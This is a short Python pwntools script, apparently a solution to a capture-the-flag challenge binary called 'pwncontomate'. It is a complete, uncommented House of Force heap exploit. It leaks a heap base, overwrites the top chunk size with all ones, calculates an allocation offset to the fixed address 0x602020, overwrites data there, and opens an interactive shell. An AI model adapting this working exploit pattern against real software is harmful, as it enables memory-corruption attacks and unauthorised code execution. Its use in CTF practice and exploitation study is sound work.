#!/usr/bin/python3
from pwn import process, p64

shell = process("./pwncontomate")

def malloc(size, data):
    shell.sendlineafter(b"> ", b"1")
    shell.sendlineafter(b"pwncitos?: ", str(size).encode())
    shell.sendlineafter(b"Ingredientes: ", data)

shell.recvuntil(b"vuelto ")
heap_base = int(shell.recvline().strip(), 16)

malloc(0x18, b"A" * 24 + p64(0xffffffffffffffff))

target = 0x602020
offset = (target - 0x20) - (heap_base + 0x20)

malloc(offset, b"")
malloc(0x18, b"Estos son otros ingredientes\x00")

shell.recvline()
shell.interactive()
